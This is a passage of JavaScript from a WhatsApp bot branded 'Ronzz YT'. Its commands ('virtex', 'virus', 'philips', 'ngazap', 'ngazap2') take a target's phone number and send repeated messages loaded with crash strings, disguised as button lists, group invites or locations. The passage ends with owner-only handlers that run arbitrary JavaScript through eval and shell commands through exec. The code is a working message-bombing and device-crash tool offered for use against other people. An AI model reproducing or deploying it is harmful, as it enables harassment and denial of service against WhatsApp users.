{ index: 51, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 52, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 53, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 54, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 55, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 56, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 57, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 58, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 59, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 60, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 61, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 62, quickReplyButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, id: ``}},
{ index: 63, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 64, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 65, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 66, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 67, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 68, callButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, phoneNumber: ``}},
{ index: 69, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ index: 70, urlButton: { displayText: `☣️ HII I AM RONZZ YT 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}}
]}, { quoted: lep })
await sleep(1000)
}
reply('SUCCES ✅')
}
break
case 'virtex':{
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`Ronzz YT ${virtex(prefix)}`}, {quoted:virusnya})
await sleep(1000)
}
reply('SUCCES ✅')
}
break
case 'virus':{
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`Ronzz YT ${virus}`}, {quoted:virusnya})
await sleep(1000)
}
reply('SUCCES ✅')
}
break
case 'philips':{
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
ronzz.sendMessage(num, {text:`Ronzz YT ${philips}`}, {quoted:virusnya})
await sleep(1000)
}
reply('SUCCES ✅')
}
break
case 'ngazap': {
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./options/image/thumbnail.jpg') }, { upload: ronzz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME Ronzz YT${ngazap(prefix)}`,
"groupName": `MY NAME Ronzz YT${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
ronzz.relayMessage(num, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(1000)
}
reply('SUCCES ✅')
}
break
case 'ngazap2': {
if (!itsMeronzz) return reply('Belum di addakses')
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./options/image/thumbnail.jpg') }, { upload: ronzz.waUploadToServer })
var location = generateWAMessageFromContent(num, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© Ronzz YT${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
ronzz.relayMessage(num, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply('SUCCES ✅')
}
break

break
default:
}
if (budy.startsWith('=>')) {
if (!itsMeronzz) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMeronzz) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMeronzz) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMeronzz) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
} catch (err) {
console.log(util.format(err))
}
} 